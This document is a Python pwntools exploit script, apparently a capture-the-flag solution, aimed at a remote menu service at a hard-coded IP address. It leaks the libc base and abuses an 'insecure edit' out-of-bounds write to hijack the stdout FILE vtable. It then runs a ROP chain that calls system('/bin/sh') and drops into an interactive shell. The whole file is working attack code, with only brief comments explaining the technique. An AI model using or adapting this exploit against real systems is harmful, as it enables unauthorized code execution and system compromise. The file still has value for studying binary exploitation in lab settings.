#!/usr/bin/python2

from pwn import *

context(os='linux', arch='x86_64')

p = remote('159.203.116.12', 9999)

def choice(n):
	p.recvuntil('6. exit\n')
	p.sendline(str(n))

p.recvuntil('enter your name:\n')
p.send('SPRITZERS')

READ_OFF = 0xf7220
STDOUT_OFF = 0x3c5620
IO_FILE_VTABLE_PTR_OFF = 0xd8

choice(5)
p.recvuntil('your gift:\n')
libc_base = int(p.recvline()) - READ_OFF
print('[+] Leaked libc base: 0x{:12x}'.format(libc_base))
vptr_addr = libc_base + STDOUT_OFF + IO_FILE_VTABLE_PTR_OFF

LIBC_GETS = libc_base + 0x6ed80
# mov rdi, rsp; call qword ptr [rax + 0x20]; if (![[rsp+8]+0x38]) { rsp += 0x38; ret; }
MOV_RDI_RSP = libc_base + 0x12b82b

choice(4)
p.recvuntil('enter new name:\n')
# arbitrary write address (@ users[12])
buf  = p64(vptr_addr)
# vtable + 0x20 (2)
buf += p64(LIBC_GETS)
# sh path for system(), this fptr is not accessed
buf += '/bin/sh\x00'
buf += 'A'*8
# vtable + 0x38 (1)
buf += p64(MOV_RDI_RSP)
p.send(buf)

NAME_ADDR = 0x6020a0
FIRST_VTABLE_ENTRY = 0x20

choice(2)
p.recvuntil('2. insecure edit\n')
p.sendline('2')
p.recvuntil('index: \n')
p.sendline('12')
p.recvuntil('new username: \n')
# use arbitrary write to overwrite vtable ptr to fake vtable in name
# (1) will be called (originally xsputn)
# rax is vtable ptr, so will set rdi = rsp and call (2) (gets)
p.send(p64(NAME_ADDR + 8 - FIRST_VTABLE_ENTRY)[:6])

ZERO_ADDR = 0x6020c8
POP_RDI = libc_base + 0x21102 # pop rdi; ret
SYSTEM = libc_base + 0x45390

# make sure [[rdi+8]+0x38] == 0, write ROP chain to rdi+0x38, profit!
buf  = 'A'*8
buf += p64(ZERO_ADDR-0x38)
buf += 'A'*(0x38-len(buf))
buf += p64(POP_RDI)
buf += p64(NAME_ADDR + 0x10)
buf += p64(SYSTEM)
p.sendline(buf)

p.interactive()
